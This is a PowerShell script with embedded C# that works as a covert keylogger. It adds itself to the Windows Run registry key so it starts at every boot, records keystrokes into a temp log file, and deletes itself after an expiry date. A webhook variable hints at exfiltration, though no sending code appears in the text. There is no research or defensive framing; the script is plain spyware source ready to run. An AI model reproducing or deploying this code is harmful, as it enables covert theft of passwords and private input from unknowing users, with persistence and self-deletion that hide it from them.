# Add this script to startup to ensure it runs every time the system boots
$scriptPath = $MyInvocation.MyCommand.Path  # Path of this script
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "MyStartupScript2"  # You can change this name if you like

# Check if the script is already added to startup to avoid duplicates
$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
if ($existingEntry) {
    Write-Host "Script is already added to startup." -ForegroundColor Yellow
} else {
    # Add the script to startup
    try {
        Set-ItemProperty -Path $regKey -Name $scriptName -Value "$scriptPath"
        Write-Host "Script added to startup." -ForegroundColor Green
    }
    catch {
        Write-Host "Error adding script to startup:" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }

    # Confirm that the entry has been added to the registry
    $confirmation = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
    if ($confirmation) {
        Write-Host "Script successfully added to startup." -ForegroundColor Green
    } else {
        Write-Host "Failed to add script to startup." -ForegroundColor Red
    }
}

# Ensure that the webhook URL is set directly from the command line
$webhookURL = $dc  # $webhookURL is the variable passed via the command line

# Define the path to the temp log file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')

# Set the default expiry date to 30 days from today if no expiry date is passed
if ($args.Count -gt 1) {
    # If the second argument is provided, parse it as the expiry date
    $expiryDate = [datetime]::ParseExact($args[1], 'yyyy-MM-dd', $null)
} else {
    # If no expiry date is passed, default to 30 days from today
    $expiryDate = (Get-Date).AddDays(30)
}

# Check if the script has expired
$currentDate = Get-Date
if ($currentDate -gt $expiryDate) {
    # If the script has expired, delete itself
    Write-Host "Script has expired. Deleting script file..."
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Check if the custom utility type is already loaded
$customUtilityType = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { 
    $_.GetTypes() | Where-Object { $_.Name -eq 'KeyCaptureUtility' }
}

if (-not $customUtilityType) {
    # Add Type for custom utility class
    Add-Type @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class KeyCaptureUtility
{
    // DLL Imports for keyboard input functions
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    public static void CaptureInput(string filePath)
    {
        StringBuilder captureBuffer = new StringBuilder();
        var lastKeypressTime = System.Diagnostics.Stopwatch.StartNew();
        TimeSpan keypressThreshold = TimeSpan.FromSeconds(10);

        // Ensure the file exists, create it if it doesn't
        if (!File.Exists(filePath))
        {
            File.Create(filePath).Dispose();
            Console.WriteLine("File created: " + filePath);  // Log file creation
        }

        // Continuous loop to capture keypresses
        while (true)
        {
            bool keyPressed = false;

            // Check if the last key press time exceeds threshold
            while (lastKeypressTime.Elapsed < keypressThreshold)
            {
                Thread.Sleep(30);  // Sleep for 30 ms

                // Iterate through all possible virtual keycodes
                for (int asc = 8; asc <= 254; asc++)
                {
                    short keyst = GetAsyncKeyState(asc);

                    // Check if the key is pressed (key state = -32767 means pressed)
                    if (keyst == -32767)
                    {
                        keyPressed = true;
                        lastKeypressTime.Restart();  // Reset inactivity timer

                        // Translate the key to a readable character
                        int vtkey = MapVirtualKey((uint)asc, 3);
                        byte[] kbst = new byte[256];
                        GetKeyboardState(kbst);
                        StringBuilder logChar = new StringBuilder();

                        // Get the character for the key
                        if (ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0) != 0)
                        {
                            string charPressed = logChar.ToString();

                            // Handle special keys like Backspace, Enter, Escape, Shift, Alt, and other common keys
                            switch (asc)
                            {
                                case 8:
                                    charPressed = "[BKSP]";        // Backspace
                                    break;
                                case 13:
                                    charPressed = "[ENTER]";       // Enter
                                    break;
                                case 27:
                                    charPressed = "[ESC]";         // Escape
                                    break;
                                case 16:
                                    charPressed = "[SHIFT]";       // Shift
                                    break;
                                case 17:
                                    charPressed = "[CTRL]";        // Control (Ctrl)
                                    break;
                                case 18:
                                    charPressed = "[ALT]";         // Alt
                                    break;
                                case 91:
                                case 92:
                                    charPressed = "[CMD]";         // Command (or Windows) key
                                    break;
                                case 32:
                                    charPressed = "[SPACE]";       // Spacebar
                                    break;
                                case 9:
                                    charPressed = "[TAB]";         // Tab
                                    break;
                                case 20:
                                    charPressed = "[CAPSLOCK]";    // CapsLock
                                    break;
                                case 33:
                                    charPressed = "[PAGEUP]";      // Page Up
                                    break;
                                case 34:
                                    charPressed = "[PAGEDOWN]";    // Page Down
                                    break;
                                case 35:
                                    charPressed = "[END]";         // End
                                    break;
                                case 36:
                                    charPressed = "[HOME]";        // Home
                                    break;
                                case 37:
                                    charPressed = "[LEFTARROW]";   // Left Arrow
                                    break;
                                case 38:
                                    charPressed = "[UPARROW]";     // Up Arrow
                                    break;
                                case 39:
                                    charPressed = "[RIGHTARROW]";  // Right Arrow
                                    break;
                                case 40:
                                    charPressed = "[DOWNARROW]";   // Down Arrow
                                    break;
                                case 44:
                                    charPressed = "[PRINTSCREEN]"; // Print Screen
                                    break;
                                case 45:
                                    charPressed = "[INSERT]";      // Insert
                                    break;
                                case 46:
                                    charPressed = "[DELETE]";      // Delete
                                    break;
                                case 144:
                                    charPressed = "[NUMLOCK]";     // Num Lock
                                    break;
                                case 145:
                                    charPressed = "[SCROLLLOCK]";  // Scroll Lock
                                    break;
                                default:
                                    // For all other keys, we translate normally
                                    captureBuffer.Append(charPressed);
                                    break;
                            }
                        }
                    }
                }
            }

            if (keyPressed)
            {
                // Save input to the file with a timestamp
                string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                string message = timestamp + " : " + captureBuffer.ToString() + "\r\n";
                File.AppendAllText(filePath, message);
                Console.WriteLine("Input saved: " + message);  // Log the saved message
                captureBuffer.Clear();  // Clear the input buffer after saving
            }

            // Reset the stopwatch and continue checking
            lastKeypressTime.Restart();
        }
    }
}

"@
}

# Call the CaptureInput method to start capturing inputs (synchronously)
[KeyCaptureUtility]::CaptureInput($tempFilePath)
